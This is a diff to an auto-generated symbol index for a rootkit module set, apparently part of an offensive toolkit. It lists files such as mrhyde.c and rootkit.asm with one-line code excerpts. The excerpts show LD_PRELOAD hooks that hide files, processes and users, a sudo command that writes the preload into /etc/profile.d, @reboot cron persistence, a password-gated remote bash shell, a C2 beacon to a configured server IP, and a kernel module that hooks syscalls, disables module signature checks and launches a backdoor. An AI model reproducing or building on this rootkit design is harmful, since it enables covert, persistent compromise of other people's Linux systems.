@@ -4,6 +4,8 @@
 - Layer: utility
 - Language: c
 - Symbols:
+  - `Command` (struct, line 43)
+  - `VirtualFile` (struct, line 49)
   - `get_ld_preload` (function, line 83) `char *get_ld_preload()`
   - `set_ld_preload` (function, line 87) `void set_ld_preload(const char *ld_preload)`
   - `ensure_ld_preload` (function, line 100) `void ensure_ld_preload()`
@@ -26,21 +28,55 @@
   - `signal_handler` (function, line 608) `void signal_handler(int signum)`
   - `reboot_system` (function, line 614) `void reboot_system()`
   - `main` (function, line 638) `int main()`
-  - `PORT` (macro, line 30)
-  - `BUFFER_SIZE` (macro, line 32)
-  - `MAX_COMMANDS` (macro, line 33)
-  - `DESIRED_LD_PRELOAD` (macro, line 34)
-  - `PID_FILE` (macro, line 35)
-  - `HIDE_FILE` (macro, line 36)
-  - `KEY_FILE` (macro, line 37)
-  - `PASSWORD` (macro, line 39)
-  - `PATH_MAX` (macro, line 41)
+  - `getenv` (function, line 85) `return getenv("LD_PRELOAD");`
+  - `fprintf` (function, line 90) `fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);`
+  - `fclose` (function, line 91) `fclose(profile);`
+  - `printf` (function, line 103) `printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD);`
+  - `execl` (function, line 107) `execl("/bin/bash", "bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_preload.sh'", (char *)NULL);`
+  - `perror` (function, line 108) `perror("execl failed");`
+  - `exit` (function, line 109) `exit(EXIT_FAILURE);`
+  - `waitpid` (function, line 113) `waitpid(pid, NULL, 0);`
+  - `pclose` (function, line 130) `pclose(cmd);`
+  - `chmod` (function, line 153) `chmod(path, mode);`
+  - `snprintf` (function, line 159) `snprintf(command, sizeof(command), "@reboot %s\n", path);`
+  - `system` (function, line 163) `system(command);`
+  - `remove` (function, line 164) `remove(tmp_path);`
+  - `srand` (function, line 169) `srand(time(NULL));`
+  - `free` (function, line 197) `free(filename);`
+  - `fwrite` (function, line 226) `fwrite(buffer, 1, bytesRead, dest);`
+  - `mkdir` (function, line 247) `mkdir(dirname(new_path), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);`
+  - `dlclose` (function, line 316) `dlclose(rootkit_handle);`
+  - `send` (function, line 328) `send(sock, "Enter password: ", 16, 0);`
+  - `memset` (function, line 330) `memset(buffer, 0, BUFFER_SIZE);`
+  - `close` (function, line 332) `close(sock);`
+  - `pthread_exit` (function, line 333) `pthread_exit(NULL);`
+  - `execvp` (function, line 387) `execvp("bash", command_args);`
+  - `raise` (function, line 440) `raise(SIGTERM);`
+  - `unsetenv` (function, line 455) `unsetenv("LD_PRELOAD");`
+  - `time` (function, line 491) `time(&current_time);`
+  - `sleep` (function, line 527) `sleep(1);`
+  - `closedir` (function, line 558) `closedir(dir);`
+  - `setsid` (function, line 565) `setsid();`
+  - `setenv` (function, line 578) `setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);`
+  - `signal` (function, line 655) `signal(SIGTERM, signal_handler);`
+  - `pthread_detach` (function, line 703) `pthread_detach(client_thread);`
+  - `pthread_join` (function, line 707) `pthread_join(mon_thread, NULL);`
+  - `PORT` (macro, line 30) `#define PORT`
+  - `BUFFER_SIZE` (macro, line 32) `#define BUFFER_SIZE`
+  - `MAX_COMMANDS` (macro, line 33) `#define MAX_COMMANDS`
+  - `DESIRED_LD_PRELOAD` (macro, line 34) `#define DESIRED_LD_PRELOAD`
+  - `PID_FILE` (macro, line 35) `#define PID_FILE`
+  - `HIDE_FILE` (macro, line 36) `#define HIDE_FILE`
+  - `KEY_FILE` (macro, line 37) `#define KEY_FILE`
+  - `PASSWORD` (macro, line 39) `#define PASSWORD`
+  - `PATH_MAX` (macro, line 41) `#define PATH_MAX`
 
 ## modules/rootkit/mrhyde.c
 - Layer: utility
 - Language: c
 - Symbols:
   - `linux_dirent64` (struct, line 548)
+  - `original_dirent` (type_alias, line 51) `typedef struct dirent original_dirent;`
   - `load_hidden_pids` (function, line 72) `void load_hidden_pids()`
   - `load_hidden_files` (function, line 92) `void load_hidden_files()`
   - `unlink` (function, line 112) `int unlink(const char *pathname)`
@@ -60,29 +96,48 @@
   - `getdents` (function, line 557) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `getdents64` (function, line 618) `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `main` (function, line 677) `int main()`
-  - `HIDDEN_DIR` (macro, line 32)
-  - `HIDDEN_FILE` (macro, line 34)
-  - `HIDDEN_FILE1` (macro, line 35)
-  - `HIDDEN_FILE2` (macro, line 36)
-  - `HIDDEN_FILE3` (macro, line 37)
-  - `HIDDEN_FILE4` (macro, line 38)
-  - `HIDDEN_FILE5` (macro, line 39)
-  - `HIDDEN_FILE6` (macro, line 40)
-  - `HIDDEN_FILE7` (macro, line 41)
-  - `HIDDEN_FILE8` (macro, line 42)
-  - `HIDDEN_FILE9` (macro, line 43)
-  - `PATHMRHYDE` (macro, line 44)
-  - `HIDE_DIR` (macro, line 45)
-  - `HIDE_USER` (macro, line 47)
-  - `MAX_HIDE_PIDS` (macro, line 48)
-  - `PID_FILE_PATH` (macro, line 49)
-  - `FILE_HIDE_PATH` (macro, line 50)
+  - `int` (function, line 54) `typedef int (*orig_unlink_f_type)(const char *pathname);`
+  - `perror` (function, line 76) `perror("Error opening PID file");`
+  - `fclose` (function, line 89) `fclose(file);`
+  - `orig_unlink` (function, line 121) `return orig_unlink(pathname);`
+  - `orig_kill` (function, line 141) `return orig_kill(pid, sig);`
+  - `orig_remove` (function, line 153) `return orig_remove(pathname);`
+  - `orig_unlinkat` (function, line 175) `return orig_unlinkat(dirfd, pathname, flags);`
+  - `snprintf` (function, line 183) `snprintf(path, sizeof(path), "/proc/%d", pid);`
+  - `fprintf` (function, line 226) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
+  - `orig_fopen` (function, line 322) `return orig_fopen(pathname, mode);`
+  - `orig_open` (function, line 366) `return orig_open(pathname, flags, mode);`
+  - `orig_openat` (function, line 410) `return orig_openat(dirfd, pathname, flags, mode);`
+  - `orig_stat` (function, line 454) `return orig_stat(pathname, statbuf);`
+  - `orig_lstat` (function, line 498) `return orig_lstat(pathname, statbuf);`
+  - `orig_fstat` (function, line 544) `return orig_fstat(fd, statbuf);`
+  - `memmove` (function, line 606) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
+  - `printf` (function, line 693) `printf("PID: %ld, Username: %s\n", pid, username);`
+  - `closedir` (function, line 698) `closedir(proc);`
+  - `HIDDEN_DIR` (macro, line 32) `#define HIDDEN_DIR`
+  - `HIDDEN_FILE` (macro, line 34) `#define HIDDEN_FILE`
+  - `HIDDEN_FILE1` (macro, line 35) `#define HIDDEN_FILE1`
+  - `HIDDEN_FILE2` (macro, line 36) `#define HIDDEN_FILE2`
+  - `HIDDEN_FILE3` (macro, line 37) `#define HIDDEN_FILE3`
+  - `HIDDEN_FILE4` (macro, line 38) `#define HIDDEN_FILE4`
+  - `HIDDEN_FILE5` (macro, line 39) `#define HIDDEN_FILE5`
+  - `HIDDEN_FILE6` (macro, line 40) `#define HIDDEN_FILE6`
+  - `HIDDEN_FILE7` (macro, line 41) `#define HIDDEN_FILE7`
+  - `HIDDEN_FILE8` (macro, line 42) `#define HIDDEN_FILE8`
+  - `HIDDEN_FILE9` (macro, line 43) `#define HIDDEN_FILE9`
+  - `PATHMRHYDE` (macro, line 44) `#define PATHMRHYDE`
+  - `HIDE_DIR` (macro, line 45) `#define HIDE_DIR`
+  - `HIDE_USER` (macro, line 47) `#define HIDE_USER`
+  - `MAX_HIDE_PIDS` (macro, line 48) `#define MAX_HIDE_PIDS`
+  - `PID_FILE_PATH` (macro, line 49) `#define PID_FILE_PATH`
+  - `FILE_HIDE_PATH` (macro, line 50) `#define FILE_HIDE_PATH`
 
 ## modules/rootkit/mrhyde2.c
 - Layer: utility
 - Language: c
 - Symbols:
   - `linux_dirent64` (struct, line 461)
+  - `original_dirent` (type_alias, line 48) `typedef struct dirent original_dirent;`
   - `load_hidden_pids` (function, line 62) `void load_hidden_pids()`
   - `unlink` (function, line 82) `int unlink(const char *pathname)`
   - `kill` (function, line 94) `int kill(pid_t pid, int sig)`
@@ -100,22 +155,40 @@
   - `getdents` (function, line 470) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `getdents64` (function, line 527) `int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `main` (function, line 582) `int main()`
-  - `HIDDEN_DIR` (macro, line 30)
-  - `HIDDEN_FILE` (macro, line 32)
-  - `HIDDEN_FILE1` (macro, line 33)
-  - `HIDDEN_FILE2` (macro, line 34)
-  - `HIDDEN_FILE3` (macro, line 35)
-  - `HIDDEN_FILE4` (macro, line 36)
-  - `HIDDEN_FILE5` (macro, line 37)
-  - `HIDDEN_FILE6` (macro, line 38)
-  - `HIDDEN_FILE7` (macro, line 39)
-  - `HIDDEN_FILE8` (macro, line 40)
-  - `HIDDEN_FILE9` (macro, line 41)
-  - `PATHMRHYDE` (macro, line 42)
-  - `HIDE_DIR` (macro, line 43)
-  - `HIDE_USER` (macro, line 45)
-  - `MAX_HIDE_PIDS` (macro, line 46)
-  - `PID_FILE_PATH` (macro, line 47)
+  - `int` (function, line 51) `typedef int (*orig_unlink_f_type)(const char *pathname);`
+  - `perror` (function, line 66) `perror("Error opening PID file");`
+  - `fclose` (function, line 79) `fclose(file);`
+  - `orig_unlink` (function, line 91) `return orig_unlink(pathname);`
+  - `orig_kill` (function, line 111) `return orig_kill(pid, sig);`
+  - `orig_remove` (function, line 123) `return orig_remove(pathname);`
+  - `orig_unlinkat` (function, line 145) `return orig_unlinkat(dirfd, pathname, flags);`
+  - `snprintf` (function, line 153) `snprintf(path, sizeof(path), "/proc/%d", pid);`
+  - `fprintf` (function, line 186) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
+  - `orig_fopen` (function, line 270) `return orig_fopen(pathname, mode);`
+  - `orig_open` (function, line 307) `return orig_open(pathname, flags, mode);`
+  - `orig_openat` (function, line 344) `return orig_openat(dirfd, pathname, flags, mode);`
+  - `orig_stat` (function, line 381) `return orig_stat(pathname, statbuf);`
+  - `orig_lstat` (function, line 418) `return orig_lstat(pathname, statbuf);`
+  - `orig_fstat` (function, line 457) `return orig_fstat(fd, statbuf);`
+  - `memmove` (function, line 515) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
+  - `printf` (function, line 598) `printf("PID: %ld, Username: %s\n", pid, username);`
+  - `closedir` (function, line 603) `closedir(proc);`
+  - `HIDDEN_DIR` (macro, line 30) `#define HIDDEN_DIR`
+  - `HIDDEN_FILE` (macro, line 32) `#define HIDDEN_FILE`
+  - `HIDDEN_FILE1` (macro, line 33) `#define HIDDEN_FILE1`
+  - `HIDDEN_FILE2` (macro, line 34) `#define HIDDEN_FILE2`
+  - `HIDDEN_FILE3` (macro, line 35) `#define HIDDEN_FILE3`
+  - `HIDDEN_FILE4` (macro, line 36) `#define HIDDEN_FILE4`
+  - `HIDDEN_FILE5` (macro, line 37) `#define HIDDEN_FILE5`
+  - `HIDDEN_FILE6` (macro, line 38) `#define HIDDEN_FILE6`
+  - `HIDDEN_FILE7` (macro, line 39) `#define HIDDEN_FILE7`
+  - `HIDDEN_FILE8` (macro, line 40) `#define HIDDEN_FILE8`
+  - `HIDDEN_FILE9` (macro, line 41) `#define HIDDEN_FILE9`
+  - `PATHMRHYDE` (macro, line 42) `#define PATHMRHYDE`
+  - `HIDE_DIR` (macro, line 43) `#define HIDE_DIR`
+  - `HIDE_USER` (macro, line 45) `#define HIDE_USER`
+  - `MAX_HIDE_PIDS` (macro, line 46) `#define MAX_HIDE_PIDS`
+  - `PID_FILE_PATH` (macro, line 47) `#define PID_FILE_PATH`
 
 ## modules/rootkit/mrhyde3.c
 - Layer: utility
@@ -125,6 +198,7 @@
   - `io_uring_cq` (struct, line 61)
   - `io_uring` (struct, line 65)
   - `linux_dirent64` (struct, line 560)
+  - `original_dirent` (type_alias, line 312) `typedef struct dirent original_dirent;`
   - `__io_uring_setup` (function, line 73) `static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p)`
   - `__io_uring_enter` (function, line 76) `static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
    ...`
@@ -155,29 +229,57 @@
   - `fstat` (function, line 535) `int fstat(int fd, struct stat *statbuf)`
   - `getdents` (function, line 569) `int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)`
   - `getdents64` (function, line 604) `ssize_t getdents64(int fd, void *dirp, size_t count)`
-  - `_GNU_SOURCE` (macro, line 6)
-  - `HIDDEN_DIR` (macro, line 33)
-  - `HIDDEN_FILE` (macro, line 34)
-  - `HIDDEN_FILE1` (macro, line 35)
-  - `HIDDEN_FILE2` (macro, line 36)
-  - `HIDDEN_FILE3` (macro, line 37)
-  - `HIDDEN_FILE4` (macro, line 38)
-  - `HIDDEN_FILE5` (macro, line 39)
-  - `HIDDEN_FILE6` (macro, line 40)
-  - `HIDDEN_FILE7` (macro, line 41)
-  - `HIDDEN_FILE8` (macro, line 42)
-  - `HIDDEN_FILE9` (macro, line 43)
-  - `PATHMRHYDE` (macro, line 44)
-  - `HIDE_DIR` (macro, line 45)
-  - `HIDE_USER` (macro, line 46)
-  - `MAX_HIDE_PIDS` (macro, line 47)
-  - `PID_FILE_PATH` (macro, line 48)
-  - `FILE_HIDE_PATH` (macro, line 49)
-  - `IO_URING_QUEUE_DEPTH` (macro, line 50)
-  - `IO_URING_BUFFER_SIZE` (macro, line 51)
-  - `C2_SERVER_IP` (macro, line 52)
-  - `C2_PORT` (macro, line 53)
-  - `CQE_TIMEOUT_MS` (macro, line 54)
+  - `syscall` (function, line 74) `return syscall(__NR_io_uring_setup, entries, p);`
+  - `memset` (function, line 87) `memset(&params, 0, sizeof(params));`
+  - `free` (function, line 191) `free(iov.iov_base);`
+  - `pthread_mutex_lock` (function, line 199) `pthread_mutex_lock(&ring_mutex);`
+  - `memcpy` (function, line 242) `memcpy(buf + total_read, block, bytes_read);`
+  - `close` (function, line 246) `close(fd);`
+  - `pthread_mutex_unlock` (function, line 248) `pthread_mutex_unlock(&ring_mutex);`
+  - `fseek` (function, line 256) `fseek(f, 0, SEEK_END);`
+  - `fclose` (function, line 263) `fclose(f);`
+  - `snprintf` (function, line 302) `snprintf(path, sizeof(path), "/proc/%d", pid);`
+  - `int` (function, line 314) `typedef int (*orig_unlink_f_type)(const char *pathname);`
+  - `orig_unlink` (function, line 371) `return orig_unlink(pathname);`
+  - `orig_kill` (function, line 381) `return orig_kill(pid, sig);`
+  - `orig_remove` (function, line 387) `return orig_remove(pathname);`
+  - `orig_unlinkat` (function, line 403) `return orig_unlinkat(dirfd, pathname, flags);`
+  - `orig_fopen` (function, line 427) `return orig_fopen(pathname, mode);`
+  - `va_start` (function, line 452) `va_start(args, flags);`
+  - `va_end` (function, line 454) `va_end(args);`
+  - `orig_open` (function, line 455) `return orig_open(pathname, flags, mode);`
+  - `orig_openat` (function, line 483) `return orig_openat(dirfd, pathname, flags, mode);`
+  - `orig_stat` (function, line 507) `return orig_stat(pathname, statbuf);`
+  - `orig_lstat` (function, line 531) `return orig_lstat(pathname, statbuf);`
+  - `orig_fstat` (function, line 557) `return orig_fstat(fd, statbuf);`
+  - `memmove` (function, line 596) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
+  - `inet_pton` (function, line 657) `inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);`
+  - `sleep` (function, line 697) `sleep(60);`
+  - `pthread_create` (function, line 714) `pthread_create(&c2_thread, NULL, c2_beacon_thread, NULL);`
+  - `pthread_detach` (function, line 715) `pthread_detach(c2_thread);`
+  - `_GNU_SOURCE` (macro, line 6) `#define _GNU_SOURCE`
+  - `HIDDEN_DIR` (macro, line 33) `#define HIDDEN_DIR`
+  - `HIDDEN_FILE` (macro, line 34) `#define HIDDEN_FILE`
+  - `HIDDEN_FILE1` (macro, line 35) `#define HIDDEN_FILE1`
+  - `HIDDEN_FILE2` (macro, line 36) `#define HIDDEN_FILE2`
+  - `HIDDEN_FILE3` (macro, line 37) `#define HIDDEN_FILE3`
+  - `HIDDEN_FILE4` (macro, line 38) `#define HIDDEN_FILE4`
+  - `HIDDEN_FILE5` (macro, line 39) `#define HIDDEN_FILE5`
+  - `HIDDEN_FILE6` (macro, line 40) `#define HIDDEN_FILE6`
+  - `HIDDEN_FILE7` (macro, line 41) `#define HIDDEN_FILE7`
+  - `HIDDEN_FILE8` (macro, line 42) `#define HIDDEN_FILE8`
+  - `HIDDEN_FILE9` (macro, line 43) `#define HIDDEN_FILE9`
+  - `PATHMRHYDE` (macro, line 44) `#define PATHMRHYDE`
+  - `HIDE_DIR` (macro, line 45) `#define HIDE_DIR`
+  - `HIDE_USER` (macro, line 46) `#define HIDE_USER`
+  - `MAX_HIDE_PIDS` (macro, line 47) `#define MAX_HIDE_PIDS`
+  - `PID_FILE_PATH` (macro, line 48) `#define PID_FILE_PATH`
+  - `FILE_HIDE_PATH` (macro, line 49) `#define FILE_HIDE_PATH`
+  - `IO_URING_QUEUE_DEPTH` (macro, line 50) `#define IO_URING_QUEUE_DEPTH`
+  - `IO_URING_BUFFER_SIZE` (macro, line 51) `#define IO_URING_BUFFER_SIZE`
+  - `C2_SERVER_IP` (macro, line 52) `#define C2_SERVER_IP`
+  - `C2_PORT` (macro, line 53) `#define C2_PORT`
+  - `CQE_TIMEOUT_MS` (macro, line 54) `#define CQE_TIMEOUT_MS`
 
 ## modules/rootkit/rootkit.asm
 - Layer: utility
@@ -197,12 +299,25 @@
   - `disable_module_signature_verification` (function, line 181) `static void disable_module_signature_verification(void)`
   - `hook_syscalls` (function, line 195) `static int __init hook_syscalls(void)`
   - `unhook_syscalls` (function, line 208) `static void __exit unhook_syscalls(void)`
-  - `HIDDEN_PROCESS_NAME` (macro, line 26)
-  - `HIDDEN_FILE_NAME` (macro, line 27)
-  - `LISTENER_IP` (macro, line 28)
-  - `LISTENER_PORT` (macro, line 29)
-  - `SPECIAL_STRING` (macro, line 31)
-  - `SPECIAL_STRING_PORT` (macro, line 34)
+  - `long` (function, line 38) `asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);`
+  - `ssize_t` (function, line 40) `asmlinkage ssize_t (*original_read)(int fd, void __user *buf, size_t count);`
+  - `memmove` (function, line 89) `memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));`
+  - `printk` (function, line 146) `printk(KERN_INFO "Special string found: %s\n", buffer);`
+  - `sock_release` (function, line 161) `sock_release(sock);`
+  - `call_usermodehelper` (function, line 166) `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
+  - `strlen` (function, line 174) `return strlen(backdoor_message);`
+  - `original_read` (function, line 176) `return original_read(fd, buf, count);`
+  - `volatile` (function, line 185) `asm volatile("mov %%cr4, %0" : "=r" (cr4));`
+  - `register_kretprobe` (function, line 200) `register_kretprobe(&kretprobe_getdents);`
+  - `unregister_kretprobe` (function, line 210) `unregister_kretprobe(&kretprobe_getdents);`
+  - `module_init` (function, line 214) `module_init(hook_syscalls);`
+  - `MODULE_LICENSE` (function, line 217) `MODULE_LICENSE("GPL");`
+  - `HIDDEN_PROCESS_NAME` (macro, line 26) `#define HIDDEN_PROCESS_NAME`
+  - `HIDDEN_FILE_NAME` (macro, line 27) `#define HIDDEN_FILE_NAME`
+  - `LISTENER_IP` (macro, line 28) `#define LISTENER_IP`
+  - `LISTENER_PORT` (macro, line 29) `#define LISTENER_PORT`
+  - `SPECIAL_STRING` (macro, line 31) `#define SPECIAL_STRING`
+  - `SPECIAL_STRING_PORT` (macro, line 34) `#define SPECIAL_STRING_PORT`
 - Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
 
 ## modules/rootkit/rootkit.mod.c
@@ -210,4 +325,5 @@
 - Doc: include <linux/module.h> define INCLUDE_VERMAGIC include <linux/build-salt.h> include <linux/elfnote-lto.h> include <lin
 - Language: c
 - Symbols:
-  - `INCLUDE_VERMAGIC` (macro, line 2)
+  - `MODULE_INFO` (function, line 16) `MODULE_INFO(vermagic, VERMAGIC_STRING);`
+  - `INCLUDE_VERMAGIC` (macro, line 2) `#define INCLUDE_VERMAGIC`
